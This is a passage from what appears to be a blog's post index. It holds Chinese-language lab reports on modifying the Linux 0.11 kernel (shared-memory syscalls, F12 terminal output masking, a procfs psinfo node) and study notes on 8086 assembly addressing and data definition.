及相关资料。\n特别提醒：没有父子关系的进程之间进行共享内存，shmget() 的第一个参数 key 不要用 IPC_PRIVATE，否则无法共享。用什么数字可视心情而定。\n（2）获得空闲物理页面 实验者需要考虑如何实现页面共享。首先看一下 Linux 0.11 如何操作页面，如何管理进程地址空间。\n在 kernel/fork.c 文件中有：\n1 2 3 4 5 6 7 8 int copy_process(…) { struct task_struct *p; p = (struct task_struct *) get_free_page(); if (!p) return -EAGAIN; // …… } 函数 get_free_page() 用来获得一个空闲物理页面，在 mm/memory.c 文件中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 unsigned long get_free_page(void) { register unsigned long __res asm(\u0026#34;ax\u0026#34;); __asm__(\u0026#34;std ; repne ; scasb\\n\\t\u0026#34; \u0026#34;jne 1f\\n\\t\u0026#34; \u0026#34;movb $1,1(%%edi)\\n\\t\u0026#34; // 页面数*4KB=相对页面起始地址 \u0026#34;sall $12,%%ecx\\n\\t\u0026#34; // 在加上低端的内存地址，得到的是物理起始地址 \u0026#34;addl %2,%%ecx\\n\\t\u0026#34; \u0026#34;movl %%ecx,%%edx\\n\\t\u0026#34; \u0026#34;movl $1024,%%ecx\\n\\t\u0026#34; \u0026#34;leal 4092(%%edx),%%edi\\n\\t\u0026#34; \u0026#34;rep ; stosl\\n\\t\u0026#34; //edx赋给eax，eax返回了物理起始地址 \u0026#34;movl %%edx,%%eax\\n\u0026#34; \u0026#34;1:\u0026#34; :\u0026#34;=a\u0026#34; (__res) :\u0026#34;0\u0026#34; (0),\u0026#34;i\u0026#34; (LOW_MEM),\u0026#34;c\u0026#34; (PAGING_PAGES), \u0026#34;D\u0026#34; (mem_map+PAGING_PAGES-1):\u0026#34;di\u0026#34;,\u0026#34;cx\u0026#34;,\u0026#34;dx\u0026#34;); return __res; } static unsigned char mem_map [ PAGING_PAGES ] = {0,}; 显然 get_free_page 函数就是在 mem_map 位图中寻找值为 0 的项（空闲页面），该函数返回的是该页面的起始物理地址。\n（3）地址映射 有了空闲的物理页面，接下来需要完成线性地址和物理页面的映射，Linux 0.11 中也有这样的代码，看看 mm/memory.c 中的 do_no_page(unsigned long address)，该函数用来处理线性地址 address 对应的物理页面无效的情况（即缺页中断），do_no_page 函数中调用一个重要的函数 get_empty_page(address)，其中有：\n1 2 3 4 5 // 函数 get_empty_page(address) unsigned long tmp=get_free_page(); // 建立线性地址和物理地址的映射 put_page(tmp, address); 显然这两条语句就用来获得空闲物理页面，然后填写线性地址 address 对应的页目录和页表。\n（4）寻找空闲的虚拟地址空间 有了空闲物理页面，也有了建立线性地址和物理页面的映射，但要完成本实验还需要能获得一段空闲的虚拟地址空闲。\n要从数据段中划出一段空间，首先需要了解进程数据段空间的分布，而这个分布显然是由 exec 系统调用决定的，所以要详细看一看 exec 的核心代码，do_execve（在文件 fs/exec.c 中）。\n在函数 do_execve() 中，修改数据段（当然是修改 LDT）的地方是 change_ldt，函数 change_ldt 实现如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 static unsigned long change_ldt(unsigned long text_size,unsigned long * page) { /*其中text_size是代码段长度，从可执行文件的头部取出，page为参数和环境页*/ unsigned long code_limit,data_limit,code_base,data_base; int i; code_limit = text_size+PAGE_SIZE -1; code_limit \u0026amp;= 0xFFFFF000; //code_limit为代码段限长=text_size对应的页数（向上取整） data_limit = 0x4000000; //数据段限长64MB code_base = get_base(current-\u0026gt;ldt[1]); data_base = code_base; // 数据段基址 = 代码段基址 set_base(current-\u0026gt;ldt[1],code_base); set_limit(current-\u0026gt;ldt[1],code_limit); set_base(current-\u0026gt;ldt[2],data_base); set_limit(current-\u0026gt;ldt[2],data_limit); __asm__(\u0026#34;pushl $0x17\\n\\tpop %%fs\u0026#34;:: ); // 从数据段的末尾开始 data_base += data_limit; // 向前处理 for (i=MAX_ARG_PAGES-1 ; i\u0026gt;=0 ; i--) { // 一次处理一页 data_base -= PAGE_SIZE; // 建立线性地址到物理页的映射 if (page[i]) put_page(page[i],data_base); } // 返回段界限 return data_limit; } 仔细分析过函数 change_ldt，想必实验者已经知道该如何从数据段中找到一页空闲的线性地址。《注释》中的图 13-6 也能给你很大帮助。\n4.9 在同一终端中同时运行两个程序 Linux 的 shell 有后台运行程序的功能。只要在命令的最后输入一个 \u0026amp;，命令就会进入后台运行，前台马上回到提示符，进而能运行下一个命令，例如：\n1 2 $ sudo ./producer \u0026amp; $ sudo ./consumer 当运行 ./consumer 的时候，producer 正在后台运行。\n5.实验步骤 1.创建test.c 挂载hdc文件系统，然后在usr/root目录内增加test.c文件用于测试地址映射，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int i = 0x12345678; int main(void) { printf(\u0026#34;The logical/virtual address of i is 0x%08x\u0026#34;, \u0026amp;i); fflush(stdout); while (i) ; return 0; } 代码添加过程截图如下： 2.寻找物理地址 首先进入Linux-0.11目录内make编译系统，然后回退至oslab目录内运行系统，再使用下述命令编译运行test.c文件\n1 2 gcc -o test test.c ./test 运行效果如下图所示： 此时会进入在test.c内的while死循环，然后ctrl+c暂停bochs。 此时需要让Linux-0.11的test跳出死循环，所以需要找到逻辑地址ds:0X00003004对应的物理地址，将它的内容更改为0。 在终端中输入sreg，得到gdtr的基址值为0x00005cb8，ldtr为0x0068即0000 0000 0110 1000 b，可知索引为1101b即13，TI位为0，即GDT中的第13项为LDT的段描述符。 输入xp /2w 0x00005cb8+13*8得到LDT段描述符，可以得到LDT的基址为0x00f9a2d0 ds段选择子为0x0017 =\u0026gt; 0000 0000 0001 0111 b，可知索引为10b即2，TI位为1，即LDT中的第2项为ds的段描述符，输入xp/2w 0x00f9a2d0+2*8得到ds段描述符，可以知道ds的基址为0x10000000，所以0x3004对应的线性地址为0x10000000+0x3004=0x10003004。输入xp /w 64*4获取页目录项，可知页表基地址为0x00fa6000。 输入xp /w 0x00fa6000+3*4得到物理基址为0xfa5000。 输入xp /w 0xfa5000+4得到的内容即test.c中的变量的值，输入setpmem 0xfa5004 4 0将它设为0。 然后在终端内输入c继续让系统运行，发现test而已跳出循环。\n3.添加系统调用 在unistd.h中增加下面的代码：\n1 2 3 4 5 6 7 8 9 10 11 #define SHM_SIZE 64 typedef struct shm_ds { unsigned int key; unsigned int size; unsigned long page; }shm_ds; int sys_shmget(unsigned int key,size_t size); void * sys_shmat(int shmid); 然后增加两个系统调用\n1 2 #define __NR_shmget 76 #define __NR_shmat 77 4.修改sys.h文件 在此文件中增加函数声明：\n1 2 extern int sys_shmget(); extern int sys_shmat(); 在system_call.s中把nr_system_calls改为78\n5.增加shm.c shm.c的位置在kernel目录下 代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 #define __LIBRARY__ #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;linux/mm.h\u0026gt; #include \u0026lt;errno.h\u0026gt; static shm_ds shm_list[SHM_SIZE] = {{0,0,0}}; int sys_shmget(unsigned int key, size_t size) { int i; void *page; if(size \u0026gt; PAGE_SIZE) return -EINVAL; page = get_free_page(); if(!page) return -ENOMEM; printk(\u0026#34;shmget get memory\u0026#39;s address is 0x%08x\\n\u0026#34;,page); for(i=0; i\u0026lt;SHM_SIZE; i++) { if(shm_list[i].key == key) return i; } for(i=0; i\u0026lt;SHM_SIZE; i++) { if(shm_list[i].key == 0) { shm_list[i].page = page; shm_list[i].key = key; shm_list[i].size = size; return i; } } return -1; } void * sys_shmat(int shmid) { int i; unsigned long data_base, brk; if(shmid \u0026lt; 0 || SHM_SIZE \u0026lt;= shmid || shm_list[shmid].page==0 || shm_list[shmid].key \u0026lt;= 0) return (void *)-EINVAL; data_base = get_base(current-\u0026gt;ldt[2]); printk(\u0026#34;current\u0026#39;s data_base = 0x%08x,new page = 0x%08x\\n\u0026#34;,data_base,shm_list[shmid].page); brk = current-\u0026gt;brk + data_base; current-\u0026gt;brk += PAGE_SIZE; if(put_page(shm_list[shmid].page, brk) == 0) return (void *)-ENOMEM; return (void *)(current-\u0026gt;brk - PAGE_SIZE); } 然后修改Kernel下的Makefile文件\n1 2 3 4 5 ### Dependencies: sem.s sem.o: sem.c ../include/linux/sem.h ../include/linux/kernel.h \\ ../include/unistd.h shm.s shm.o:shm.c ../include/unistd.h ../include/linux/kernel.h ../include/linux/sched.h ../include/linux/mm.h ../include/errno.h ... 修改截图如下： 6.编写消费者和生产者程序 在hdc的root目录下增加producer.c和consumer.c文件，这两个文件的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 /*producer*/ #define __LIBRARY__ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;linux/sem.h\u0026gt; _syscall2(sem_t *,sem_open,const char *,name,int,value); _syscall1(int,sem_post,sem_t *,sem); _syscall1(int,sem_wait,sem_t *,sem); _syscall1(int, shmat, int, shmid); _syscall2(int, shmget, unsigned int, key, size_t, size); #define PRODUCE_NUM 200 #define BUFFER_SIZE 10 #define SHM_KEY 2018 int main(int argc, char* argv[]) { sem_t *Empty,*Full,*Mutex; int i, shm_id, location=0; int *p; Empty = sem_open(\u0026#34;Empty\u0026#34;, BUFFER_SIZE); Full = sem_open(\u0026#34;Full\u0026#34;, 0); Mutex = sem_open(\u0026#34;Mutex\u0026#34;, 1); if((shm_id = shmget(SHM_KEY, BUFFER_SIZE*sizeof(int))) \u0026lt; 0) printf(\u0026#34;shmget failed!\u0026#34;); if((p = (int * )shmat(shm_id)) \u0026lt; 0) printf(\u0026#34;shmat error!\u0026#34;); for(i=0; i\u0026lt;PRODUCE_NUM; i++) { sem_wait(Empty); sem_wait(Mutex); p[location] = i; sem_post(Mutex); sem_post(Full); location = (location+1) % BUFFER_SIZE; } return 0; } consumer.c代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 /*consumer*/ #define __LIBRARY__ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;linux/sem.h\u0026gt; _syscall2(sem_t *,sem_open,const char *,name,int,value); _syscall1(int,sem_post,sem_t *,sem); _syscall1(int,sem_wait,sem_t *,sem); _syscall1(int,sem_unlink,const char*,name); _syscall1(int, shmat, int, shmid); _syscall2(int, shmget, unsigned int, key, size_t, size); #define PRODUCE_NUM 200 #define BUFFER_SIZE 10 #define SHM_KEY 2018 int main(int argc, char* argv[]) { sem_t *Empty,*Full,*Mutex; int used = 0, shm_id,location = 0; int *p; Empty = sem_open(\u0026#34;Empty\u0026#34;, BUFFER_SIZE); Full = sem_open(\u0026#34;Full\u0026#34;, 0); Mutex = sem_open(\u0026#34;Mutex\u0026#34;, 1); if((shm_id = shmget(SHM_KEY, BUFFER_SIZE*sizeof(int))) \u0026lt; 0) printf(\u0026#34;shmget failed!\\n\u0026#34;); if((p = (int * )shmat(shm_id)) \u0026lt; 0) printf(\u0026#34;link error!\\n\u0026#34;); while(1) { sem_wait(Full); sem_wait(Mutex); printf(\u0026#34;pid %d:\\tconsumer consumes item %d\\n\u0026#34;, getpid(), p[location]); fflush(stdout); sem_post(Mutex); sem_post(Empty); location = (location+1) % BUFFER_SIZE; if(++used == PRODUCE_NUM) break; } sem_unlink(\u0026#34;Mutex\u0026#34;); sem_unlink(\u0026#34;Full\u0026#34;); sem_unlink(\u0026#34;Empty\u0026#34;); return 0; } 7.运行验证 运行bochs，输入：\n1 2 gcc -o pro producer.c gcc -o con consumer.c 编译这两个程序， 然后输入\n1 2 pro \u0026gt; proOutput \u0026amp; con \u0026gt; conOutput \u0026amp; 来同时运行这两个程序，并将结果保存到proOutput和conOutput中。 最后输入sync,结果如下 关闭linux-0.11回到ubunt终端，输入sudo less hdc/usr/root/conOutput查看结果如下： ","permalink":"https://chance7bin.github.io/posts/basic/os-lab/%E5%AE%9E%E9%AA%8C7-%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84%E4%B8%8E%E5%85%B1%E4%BA%AB/","summary":"1.实验目的 深入理解操作系统的段、页式内存管理，深入理解段表、页表、逻辑地址、线性地址、物理地址等概念； 实践段、页式内存管理的地址映射过程；","title":"实验7 地址映射与共享"},{"content":"6.1 在代码段中使用数据 解释一下，程序第一行中的“dw”的含义是定义字型数据。dw即“define word”。在这里，使用dw定义了8个字型数据(数据之间以逗号分隔)，它们所占的内存空间的大小为16个字节。\n程序中的指令就要对这8个数据进行累加，可这8个数据在哪里呢？由于它们在代码段中，==程序在运行的时候CS中存放代码段的段地址，所以可以从CS 中得到它们的段地址。它们的偏移地址是多少呢？因为用dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据就在代码段的偏移0、2、4、6、8、A、C、E处。程序运行时，它们的地址就是CS:0、CS:2、CS:4、CS:6、CS:8、CS:A、CS:C、CS:E。==\n实际上，在程序中，有一个代码段，在代码段中，前面的16个字节是用“dw”定义的数据，从第16个字节开始才是汇编指令所对应的机器码。\n可以从0B3D:0010查看程序中要执行的机器指令，如图6.3所示。\n怎样执行程序中的指令呢？用 Debug 加载后，可以将IP设置为 10h，从而使CS:IP指向程序中的第一条指令。然后再用t命令、p命令，或者是g命令执行。\n如何让这个程序在编译、连接后可以在系统中直接运行呢？我们可以在源程序中指明程序的入口所在，具体做法如下。\n注意在程序6.2中加入的新内容，在程序的第一条指令的前面加上了一个标号 start，而这个标号在伪指令end的后面出现。这里，我们要再次探讨end的作用。end 除了通知编译器程序结束外，还可以通知编译器程序的入口在什么地方。在程序6.2中我们用end指令指明了程序的入口在标号start 处，也就是说，“mov bx,0”是程序的第一条指令。\n归根结底，我们若要CPU 从何处开始执行程序，只要在源程序中用“end标号”指明就可以了。\n6.2 在代码段中使用栈 完成下面的程序，利用栈，将程序中定义的数据逆序存放。\n我们要将cs:10~cs:2F的内存空间当作栈来用，初始状态下栈为空，所以ss:sp要指向栈底，则设置ss:sp指向cs:30。\n6.3 将数据、代码、栈放入不同的段 ","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC6%E7%AB%A0-%E5%8C%85%E5%90%AB%E5%A4%9A%E4%B8%AA%E6%AE%B5%E7%9A%84%E7%A8%8B%E5%BA%8F/","summary":"6.1 在代码段中使用数据 解释一下，程序第一行中的“dw”的含义是定义字型数据。dw即“define word”。在这里，使用dw定义了8个字型数据","title":"第6章 包含多个段的程序"},{"content":"1.实验目的 加深对操作系统设备管理基本原理的认识，实践键盘中断、扫描码等概念； 通过实践掌握 Linux 0.11 对键盘终端和显示器终端的处理过程。 2.实验内容 本实验的基本内容是修改 Linux 0.11 的终端设备处理代码，对键盘输入和字符显示进行非常规的控制。\n在初始状态，一切如常。用户按一次 F12 后，把应用程序向终端输出所有字母都替换为“*”。用户再按一次 F12，又恢复正常。第三次按 F12，再进行输出替换。依此类推。\n以 ls 命令为例：\n正常情况：\n1 2 # ls hello.c hello.o hello 第一次按 F12，然后输入 ls：\n1 2 # ** *****.* *****.* ***** 第二次按 F12，然后输入 ls：\n1 2 # ls hello.c hello.o hello 第三次按 F12，然后输入 ls：\n1 2 # ** *****.* *****.* ***** 3.实验报告 完成实验后，在实验报告中回答如下问题：\n在原始代码中，按下 F12，中断响应后，中断服务程序会调用 func？它实现的是什么功能？ 在你的实现中，是否把向文件输出的字符也过滤了？如果是，那么怎么能只过滤向终端输出的字符？如果不是，那么怎么能把向文件输出的字符也一并进行过滤？ 4.实验提示 本实验需要修改 Linux 0.11 的终端设备处理代码（kernel/chr_drv/console.c 文件），对键盘输入和字符显示进行非常规的控制。\n4.1键盘输入处理过程 键盘 I/O 是典型的中断驱动，在 kernel/chr_drv/console.c 文件中：\n1 2 3 4 5 void con_init(void) //控制台的初始化 { // 键盘中断响应函数设为 keyboard_interrupt set_trap_gate(0x21, \u0026amp;keyboard_interrupt); } 所以每次按键有动作，keyboard_interrupt 函数就会被调用，它在文件 kernel/chr_drv/keyboard.S（注意，扩展名是大写的 S）中实现。\n所有与键盘输入相关的功能都是在此文件中实现的，所以本实验的部分功能也可以在此文件中实现。\n简单说，keyboard_interrupt 被调用后，会将键盘扫描码做为下标，调用数组 key_table 保存的与该按键对应的响应函数。\n4.2输出字符的控制 printf() 等输出函数最终都是调用 write() 系统调用，所以控制好 write()，就能控制好输出字符。\n5.实验步骤 1.修改tty_io.c文件 进入linux-0.11/kernel/chr_drv目录，打开tty_io.c，添加如下代码，增加press_f12_handle函数。\n1 2 3 4 5 6 7 8 9 10 11 12 int switch_show_char_flag = 0; void press_f12_handle(void) { if (switch_show_char_flag == 0) { switch_show_char_flag = 1; } else if (switch_show_char_flag == 1) { switch_show_char_flag = 0; } } 2.修改keyboard.S文件 此文件和步骤1中的文件目录相同：\n在linux 0.11/chr_drv/keyboard.S 中将我们自定义的响应函数替代默认的func函数\n1 .long press_f12_handle,none,none,none 3.修改console.c文件 在console.c文件中增加如下代码\n1 2 3 4 if (switch_show_char_flag == 1 \u0026amp;\u0026amp; ( (c \u0026gt;= 48 \u0026amp;\u0026amp; c\u0026lt;= 57) || (c\u0026gt;=65 \u0026amp;\u0026amp; c\u0026lt;=90) || (c\u0026gt;=97 \u0026amp;\u0026amp; c\u0026lt;=122) ) ) { c = \u0026#39;*\u0026#39;; } 此代码对应实验的核心要求 4.修改tty.h 此文件位于include/linux目录，添加如下代码：\n1 2 extern int switch_show_char_flag; void press_f12_handle(void); 修改完后将其复制到hdc中\n5.编译运行Linux 在进入系统后，输入ls -l发现字符正常显示，此时再输入F12然后输入ls -l命令，发现所有的字符回显均变成了*号，实验结果符合预期。 遇到的问题 按下F12没反应\n在linux 0.11/chr_drv/keyboard.S 中将我们自定义的响应函数替代默认的func函数\n1 2 3 4 5 .long none,none,do_self,func\t/* 54-57 sysreq ? \u0026lt; f11 */ //.long func,none,none,none\t/* 58-5B f12 ? ? ? */ .long press_f12_handle,none,none,none\t/* 58-5B f12 ? ? ? */ .long none,none,none,none\t/* 5C-5F ? ? ? ? */ .long none,none,none,none\t/* 60-63 ? ? ? ? */ 回答问题 将F12转义成转义字符序列 [ [ L , 对F1-F12处理类似 [ [ A -\u0026gt; [ [ L\n实现了文件输出的过滤，该过滤是通过修改fs/file_dev.c中file_write()函数，实现代码类似tty_write()函数。 具体修改如下：\n1 2 3 4 5 6 7 8 9 10 while (c--\u0026gt;0) { tmp = get_fs_byte(buf++); if(f12_flag == 1) { if((tmp\u0026gt;=\u0026#39;A\u0026#39;\u0026amp;\u0026amp;tmp\u0026lt;=\u0026#39;Z\u0026#39;)||(tmp\u0026gt;=\u0026#39;a\u0026#39;\u0026amp;\u0026amp;tmp\u0026lt;=\u0026#39;z\u0026#39;)||(tmp\u0026gt;=\u0026#39;0\u0026#39;\u0026amp;\u0026amp;tmp\u0026lt;=\u0026#39;9\u0026#39;)) tmp = \u0026#39;*\u0026#39;; } *(p++) = tmp; } 如果只过滤终端输出字符，则可以去掉file_write()修改即可；\n","permalink":"https://chance7bin.github.io/posts/basic/os-lab/%E5%AE%9E%E9%AA%8C8-%E7%BB%88%E7%AB%AF%E8%AE%BE%E5%A4%87%E7%9A%84%E6%8E%A7%E5%88%B6/","summary":"1.实验目的 加深对操作系统设备管理基本原理的认识，实践键盘中断、扫描码等概念； 通过实践掌握 Linux 0.11 对键盘终端和显示器终端的处理过程。 2.实验内容","title":"实验8 终端设备的控制"},{"content":"7.1 and和or指令 (1) and指令：逻辑与指令，按位进行与运算。\n例如指令：\nmov al,01100011B\nand al,00111011B\n执行后： al=00100011B\n通过该指令可将操作对象的相应位设为0，其他位不变。例如：\n将al的第6位设为0的指令是：and al,10111111B\n(2) or指令：逻辑或指令，按位进行或运算。\n例如指令： mov al,01100011B\nor al,00111011B\n执行后：al=01111011B\n7.3 以字符形式给出的数据 我们可以在汇编程序中，用db '......'的方式指明数据是以字符的形式给出的(db:define byte)，编译器将把它们转化为相对应的ASCII码。如下面的程序。\n上面的源程序中：\n“db 'unIX'”相当于“db 75H,6EH,49H,58H”，“u”、“n”、“I”、“X”的ASCII码分别为75H、6EH、49H、58H;\n\u0026ldquo;mov al, 'a'”相当于“mov al,61H”，“a”的ASCII码为61H;\n将程序7.1编译为可执行文件后，用Debug 加载查看data段中的内容，如图7.1所示。\n7.4 大小写转换的问题 字母的大写字符和小写字符所对应的ASCII码如下。\n可以看出，就ASCII码的二进制形式来看，除第5位(位数从0开始计算)外，大写字母和小写字母的其他各位都一样。大写字母 ASCII码的第5位为0，小写字母的第5位为1。\n7.5 [bx+idata] 在前面，我们用[bx]的方式来指明一个内存单元，还可以用一种更为灵活的方式来指明内存单元：[bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata(bx中的数值加上idata)。\n指令mov ax,[bx+200]的含义:\n将一个内存单元的内容送入 ax，这个内存单元的长度为2个字节(字单元)，存放一个字，偏移地址为bx中的数值加上 200，段地址在ds 中。\n数学化的描述为：(ax)=((ds)*16+(bx)+200)\n该指令也可以写成如下格式(常用)：\nmov ax,[200+bx]\nmov ax,200[bx]\nmov ax,[ bx].200\n7.6 用[bx+idata]的方式进行数组的处理 如果用高级语言，比如C语言来描述上面的程序，大致是这样的:\n7.7 SI和DI si和di是8086CPU中和 bx 功能相近的寄存器，si 和 di 不能够分成两个8位寄存器来使用。下面的3组指令实现了相同的功能。\n代码段如下：\n注意，在程序中，==用16位寄存器进行内存单元之间的数据传送，一次复制2个字节==，一共循环8次。\n简化代码：\n7.8 [bx+si]和[bx+di] [bx+si]表示一个内存单元，它的偏移地址为(bx)+(si)(即 bx中的数值加上 si中的数值)。\n指令mov ax,[bx+si]的含义如下：\n将一个内存单元的内容送入 ax，这个内存单元的长度为2字节(字单元)，存放一个字，偏移地址为bx中的数值加上si中的数值，段地址在ds 中。\n数学化的描述为:(ax)=((ds)*16+(bx)+(si))\n该指令也可以写成如下格式(常用)：\nmov ax,[bx][si]\n7.10 不同的寻址方式的灵活应用 (1)[idata]用一个常量来表示地址，可用于直接定位一个内存单元;\n(2)[bx]用一个变量来表示内存地址，可用于间接定位一个内存单元;\n(3)[bx+idata]用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元;\n(4)[bx+si]用两个变量表示地址;\n(5)[bx+si+idata]用两个变量和一个常量表示地址。\n实验 一般来说，在需要暂存数据的时候，我们都应该使用栈。栈空间在内存中，采用相关的指令，如 push、pop等，可对其进行特殊的操作。\n==编程(待完成)== 将datasg段中每个单词的前4个字母改为大写字母。\n1 待完成 ","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC7%E7%AB%A0-%E6%9B%B4%E7%81%B5%E6%B4%BB%E7%9A%84%E5%AE%9A%E4%BD%8D%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/","summary":"7.1 and和or指令 (1) and指令：逻辑与指令，按位进行与运算。 例如指令： mov al,01100011B and al,00111011B 执行后： al=00100011B 通过该指令可将操作对象的相应位设为0，其他位不变。例","title":"第7章 更灵活的定位内存地址的方法"},{"content":"1.实验目的 掌握虚拟文件系统的实现原理； 实践文件、目录、文件系统等概念。 2.实验内容 /proc文件系统是了解系统信息的一个窗口，它不是普通意义上的文件系统，它是一个到运行中进程地址空间的访问接口。通过/proc，可以用标准Unix系统调用(比如open()、read()、write()等等)访问，就象访问一个普通文件一样。事实上，许多操作系统中的ps命令正是利用/proc来获取进程状态的。因此/proc文件系统是虚拟的文件系统，看似存在的文件实际并没有在硬盘上。其实，/proc是你了解自己系统的一个窗口，它实际存在于内存。\n在 Linux 0.11 上实现 procfs（proc 文件系统）内的 psinfo 结点。当读取此结点的内容时，可得到系统当前所有进程的状态信息。例如，用 cat 命令显示 /proc/psinfo 的内容，可得到：\n1 2 3 4 5 6 7 8 9 10 11 12 $ cat /proc/psinfo pid state father counter start_time 0 1 -1 0 0 1 1 0 28 1 4 1 1 1 73 3 1 1 27 63 6 0 4 12 817 $ cat /proc/hdinfo total_blocks: 62000; free_blocks: 39037; used_blocks: 22963; ... procfs 及其结点要在内核启动时自动创建。\n相关功能实现在 fs/proc.c 文件内。\n3.实验报告 完成实验后，在实验报告中回答如下问题：\n如果要求你在 psinfo 之外再实现另一个结点，具体内容自选，那么你会实现一个给出什么信息的结点？为什么？ 一次 read() 未必能读出所有的数据，需要继续 read()，直到把数据读空为止。而数次 read() 之间，进程的状态可能会发生变化。你认为后几次 read() 传给用户的数据，应该是变化后的，还是变化前的？ 如果是变化后的，那么用户得到的数据衔接部分是否会有混乱？如何防止混乱？ 如果是变化前的，那么该在什么样的情况下更新 psinfo 的内容？ 4.实验提示 本实验文档在 Linux 0.11 上实现 procfs（proc 文件系统）内的 psinfo 结点。当读取 psinfo 结点的内容时，可得到系统当前所有进程的状态信息。\n最后还给出来 hdinfo 结点实现的提示。\n4.1 procfs 简介 正式的 Linux 内核实现了 procfs，它是一个虚拟文件系统，通常被 mount（挂载） 到 /proc 目录上，通过虚拟文件和虚拟目录的方式提供访问系统参数的机会，所以有人称它为 “了解系统信息的一个窗口”。\n这些虚拟的文件和目录并没有真实地存在在磁盘上，而是内核中各种数据的一种直观表示。虽然是虚拟的，但它们都可以通过标准的系统调用（open()、read() 等）访问。\n例如，/proc/meminfo 中包含内存使用的信息，可以用 cat 命令显示其内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ cat /proc/meminfo MemTotal: 384780 kB MemFree: 13636 kB Buffers: 13928 kB Cached: 101680 kB SwapCached: 132 kB Active: 207764 kB Inactive: 45720 kB SwapTotal: 329324 kB SwapFree: 329192 kB Dirty: 0 kB Writeback: 0 kB …… 其实，Linux 的很多系统命令就是通过读取 /proc 实现的。例如 uname -a 的部分信息就来自 /proc/version，而 uptime 的部分信息来自 /proc/uptime 和 /proc/loadavg。\n关于 procfs 更多的信息请访问：http://en.wikipedia.org/wiki/Procfs\n4.2 基本思路 Linux 是通过文件系统接口实现 procfs，并在启动时自动将其 mount 到 /proc 目录上。\n此目录下的所有内容都是随着系统的运行自动建立、删除和更新的，而且它们完全存在于内存中，不占用任何外存空间。\nLinux 0.11 还没有实现虚拟文件系统，也就是，还没有提供增加新文件系统支持的接口。所以本实验只能在现有文件系统的基础上，通过打补丁的方式模拟一个 procfs。\nLinux 0.11 使用的是 Minix 的文件系统，这是一个典型的基于 inode 的文件系统，《注释》一书对它有详细描述。它的每个文件都要对应至少一个 inode，而 inode 中记录着文件的各种属性，包括文件类型。文件类型有普通文件、目录、字符设备文件和块设备文件等。在内核中，每种类型的文件都有不同的处理函数与之对应。我们可以增加一种新的文件类型——proc 文件，并在相应的处理函数内实现 procfs 要实现的功能。\n4.3 增加新文件类型 在 include/sys/stat.h 文件中定义了几种文件类型和相应的测试宏：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #define S_IFMT 00170000 // 普通文件 #define S_IFREG 0100000 // 块设备 #define S_IFBLK 0060000 // 目录 #define S_IFDIR 0040000 // 字符设备 #define S_IFCHR 0020000 #define S_IFIFO 0010000 //…… // 测试 m 是否是普通文件 #define S_ISREG(m) (((m) \u0026amp; S_IFMT) == S_IFREG) // 测试 m 是否是目录 #define S_ISDIR(m) (((m) \u0026amp; S_IFMT) == S_IFDIR) // 测试 m 是否是字符设备 #define S_ISCHR(m) (((m) \u0026amp; S_IFMT) == S_IFCHR) // 测试 m 是否是块设备 #define S_ISBLK(m) (((m) \u0026amp; S_IFMT) == S_IFBLK) #define S_ISFIFO(m) (((m) \u0026amp; S_IFMT) == S_IFIFO) 增加新的类型的方法分两步：\n（1）定义一个类型宏 S_IFPROC，其值应在 0010000 到 0100000 之间，但后四位八进制数必须是 0（这是 S_IFMT 的限制，分析测试宏可知原因），而且不能和已有的任意一个 S_IFXXX 相同； （2）定义一个测试宏 S_ISPROC(m)，形式仿照其它的 S_ISXXX(m) 注意，C 语言中以 “0” 直接接数字的常数是八进制数。\n4.4 让 mknod() 支持新的文件类型 psinfo 结点要通过 mknod() 系统调用建立，所以要让它支持新的文件类型。\n直接修改 fs/namei.c 文件中的 sys_mknod() 函数中的一行代码，如下：\n1 2 3 if (S_ISBLK(mode) || S_ISCHR(mode) || S_ISPROC(mode)) inode-\u0026gt;i_zone[0] = dev; // 文件系统初始化 内核初始化的全部工作是在 main() 中完成，而 main() 在最后从内核态切换到用户态，并调用 init()。\ninit() 做的第一件事情就是挂载根文件系统：\n1 2 3 4 5 6 void init(void) { // …… setup((void *) \u0026amp;drive_info); // …… } procfs 的初始化工作应该在根文件系统挂载之后开始。它包括两个步骤：\n（1）建立 /proc 目录；建立 /proc 目录下的各个结点。本实验只建立 /proc/psinfo。 （2）建立目录和结点分别需要调用 mkdir() 和 mknod() 系统调用。因为初始化时已经在用户态，所以不能直接调用 sys_mkdir() 和 sys_mknod()。必须在初始化代码所在文件中实现这两个系统调用的用户态接口，即 API： 1 2 3 4 5 6 #ifndef __LIBRARY__ #define __LIBRARY__ #endif 